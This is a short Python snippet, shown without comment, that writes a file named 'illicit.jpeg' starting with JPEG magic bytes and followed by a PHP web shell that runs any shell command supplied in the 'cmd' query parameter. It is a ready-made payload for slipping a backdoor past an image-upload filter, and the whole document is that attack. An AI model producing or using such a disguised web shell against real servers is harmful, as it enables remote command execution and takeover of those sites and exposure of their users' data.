


fh =  open('illicit.jpeg', 'w+')
fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')
fh.close()